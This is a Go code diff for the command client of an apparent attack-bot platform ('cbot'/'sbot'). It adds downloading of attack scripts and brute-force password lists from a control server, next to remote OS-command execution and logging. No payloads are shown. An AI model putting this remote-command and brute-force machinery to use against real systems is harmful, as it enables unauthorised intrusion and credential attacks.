@@ -7,7 +7,10 @@ import (
 	"fmt"
 	"github.com/cbot/client/model"
 	"github.com/cbot/client/service"
+	"github.com/cbot/utils/fileutils"
 	"google.golang.org/grpc"
+	"io/ioutil"
+	"log"
 	"os/exec"
 	"strings"
 	"time"
@@ -101,7 +104,7 @@ func (cc *CmdClient) handle(cmd *model.Cmd) ([]byte, error) {
 
 	case model.CmdCode_RunAddAttackSource:
 
-		err := cc.addAttackSource(cmd.Args[0])
+		err := cc.addAttackSource(cmd.Args[0],strings.EqualFold(cmd.Name,"fromFile"))
 
 		if err != nil {
 
@@ -110,7 +113,7 @@ func (cc *CmdClient) handle(cmd *model.Cmd) ([]byte, error) {
 
 	case model.CmdCode_RunAddAttack:
 
-		err := cc.addAttack(cmd.Args[0])
+		err := cc.addAttack(cmd.Args[0],strings.EqualFold(cmd.Name,"fromFile"))
 
 		if err != nil {
 
@@ -134,33 +137,53 @@ func (cc *CmdClient) handle(cmd *model.Cmd) ([]byte, error) {
 
 //add a attack source script
 
-func (cc *CmdClient) addAttackSource(content string) error {
+func (cc *CmdClient) addAttackSource(content string,fromFile bool) error {
+
+	var sourceScript []byte
 
 	var addSourceRequest model.AddAttackSourceRequest
 
 	data, err := base64.StdEncoding.DecodeString(content)
 
 	if err != nil {
+		errS := fmt.Sprintf("Decode base64:%s for add attack source script failed:%v",content,err)
+		log.Println(errS)
 
-		return err
+		return fmt.Errorf(errS)
 	}
 
 	if err = json.Unmarshal(data, &addSourceRequest); err != nil {
 
-		return err
+		errS := fmt.Sprintf("Decode json data:%s for add attack source script failed:%v",string(data),err)
+		log.Println(errS)
+
+		return fmt.Errorf(errS)
 	}
 
-	if addSourceRequest.ContentLen != uint64(len(addSourceRequest.Content)) {
+	if fromFile {
 
-		return fmt.Errorf("Invalid attack source script content")
+
+		if sourceScript,err = cc.downloadAndRead(string(addSourceRequest.Content));err!=nil {
+
+			errS := fmt.Sprintf("Download attack source script from sbot for add attack script failed:%v",err)
+			log.Println(errS)
+
+			return fmt.Errorf(errS)
+		}
+	}else {
+
+		sourceScript = addSourceRequest.Content
 	}
 
-	return cc.nd.AddAttackSource(addSourceRequest.Name, addSourceRequest.Types, addSourceRequest.Content)
+
+	return cc.nd.AddAttackSource(addSourceRequest.Name, addSourceRequest.Types, sourceScript)
 
 }
 
 //add a attack script
-func (cc *CmdClient) addAttack(content string) error {
+func (cc *CmdClient) addAttack(content string,fromFile bool) error {
+
+	var attackScript []byte
 
 	var addAttackRequest model.AddAttackRequest
 
@@ -168,21 +191,37 @@ func (cc *CmdClient) addAttack(content string) error {
 
 	if err != nil {
 
-		return err
+		errS := fmt.Sprintf("Decode base64:%s for add attack script failed:%v",content,err)
+		log.Println(errS)
+
+		return fmt.Errorf(errS)
+
 	}
 
 	if err = json.Unmarshal(data, &addAttackRequest); err != nil {
+		errS := fmt.Sprintf("Decode json data:%s for add attack script failed:%v",string(data),err)
+		log.Println(errS)
 
-		return err
+		return fmt.Errorf(errS)
 	}
 
-	if addAttackRequest.ContentLen != uint64(len(addAttackRequest.Content)) {
+	if fromFile {
 
-		return fmt.Errorf("Invalid attack script content")
+
+		if attackScript,err = cc.downloadAndRead(string(addAttackRequest.Content));err!=nil {
+
+			errS := fmt.Sprintf("Download attack script from sbot for add attack script failed:%v",err)
+			log.Println(errS)
+
+			return fmt.Errorf(errS)
+		}
+	}else {
+
+		attackScript = addAttackRequest.Content
 	}
 
 	return cc.nd.AddAttack(addAttackRequest.Name, addAttackRequest.AttackType, addAttackRequest.DefaultProto,
-		int(addAttackRequest.DefaultPort), addAttackRequest.Content)
+		int(addAttackRequest.DefaultPort), attackScript)
 
 }
 
@@ -198,8 +237,12 @@ func (cc *CmdClient) runOsCmd(name string, args []string) ([]byte, error) {
 
 	if err != nil {
 
+		log.Printf("Run os cmd:%s is failed:%v",name,err)
+
 		return []byte(fmt.Sprintf("%v", err)), err
 	}
+
+	log.Printf("Run os cmd:%s,result:%s",name,res)
 
 	return []byte(res), nil
 }
@@ -207,7 +250,58 @@ func (cc *CmdClient) runOsCmd(name string, args []string) ([]byte, error) {
 //add bruteforce dictory
 func (cc *CmdClient) addDict(name string, users string, passwds string) error {
 
-	cc.nd.AddDict(name, strings.Split(users, ","), strings.Split(passwds, ","))
+	usersArr := strings.Split(users,",")
+
+	if strings.Contains(passwds,",") {
+		cc.nd.AddDict(name,usersArr, strings.Split(passwds, ","))
+	}else {
+
+
+		if passwdArr,err:= cc.downloadAndReadLine(passwds);err!=nil {
+
+			errS := fmt.Sprintf("Add Bruteforce dictory failed:%v for name:%s",err,name)
+			log.Println(errS)
+
+			return fmt.Errorf(errS)
+		}else {
+
+			cc.nd.AddDict(name,usersArr, passwdArr)
+		}
+	}
+
+	log.Printf("Add bruteforce ok for name:%s",name)
 
 	return nil
 }
+
+
+func (cc *CmdClient) downloadAndRead(fname string)([]byte,error) {
+
+
+	if fpath,err := cc.nd.fserverClient.Download(fname);err!=nil {
+
+		errS := fmt.Sprintf("Download file:%s from sbot is failed:%v",fname,err)
+		log.Println(errS)
+
+		return nil, fmt.Errorf(errS)
+	}else {
+
+		return ioutil.ReadFile(fpath)
+	}
+}
+
+func (cc *CmdClient) downloadAndReadLine(fname string)([]string,error) {
+
+	if fpath,err := cc.nd.fserverClient.Download(fname);err!=nil {
+
+		errS := fmt.Sprintf("Download file:%s from sbot is failed:%v",fname,err)
+		log.Println(errS)
+
+		return nil, fmt.Errorf(errS)
+	}else {
+
+		return fileutils.ReadAllLines(fpath)
+	}
+
+}
+
